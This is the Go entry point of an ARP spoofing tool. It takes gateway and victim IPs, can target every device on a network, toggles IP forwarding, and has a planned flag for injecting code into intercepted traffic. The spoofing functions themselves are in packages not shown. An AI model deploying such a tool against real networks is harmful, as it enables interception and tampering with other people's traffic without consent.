package main

import (
	"arp_spoof/app"
	"arp_spoof/network"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/google/gopacket/pcap"
)

// flags
var (
	all          = flag.Bool("all", false, "target all devices on a network")
	enableIPFor  = flag.Bool("enipfor", false, "enable IP forwarding")
	disableIPFor = flag.Bool("disipfor", false, "disable IP forwarding")
	gateway      = flag.String("gate", "", "IP address of the network's gateway")
	victim       = flag.String("vic", "", "IP address of the victim's device")

	// TODO
	inject = flag.String("inj", "", "file location of code to inject, or code to inject directly")

	netInterface = flag.String("int", "Wi-Fi", "network interface to employ attack")
)

func main() {
	flag.Parse()

	end := make(chan os.Signal, 1)
	defer close(end)
	signal.Notify(end, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		for s := range end {
			fmt.Println(s.String(), "detected. ending program")
			os.Exit(0)
		}
	}()

	winDev, err := network.GetWindowsInterface(*netInterface)
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(winDev, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	if *gateway == "" {
		log.Fatal("err: gateway IP required")
	}

	if *enableIPFor && *disableIPFor {
		log.Fatal(errors.New("err: can either enable or disable IP forwarding, not both"))
	}

	if *enableIPFor {
		if err := network.EnableIPForwarding(*netInterface); err != nil {
			log.Fatal(err)
		}
	}

	if *disableIPFor {
		if err := network.DisableIPForwarding(*netInterface); err != nil {
			log.Fatal(err)
		}
	}

	if *all {
		if err := app.MultipleArpSpoof(*gateway, *netInterface, deviceHandle); err != nil {
			log.Fatal(err)
		}
	} else {
		if *victim == "" {
			log.Fatal("err: victim IP required")
		}

		if err := app.ArpSpoof(*gateway, *victim, *netInterface, deviceHandle); err != nil {
			log.Fatal(err)
		}
	}
}
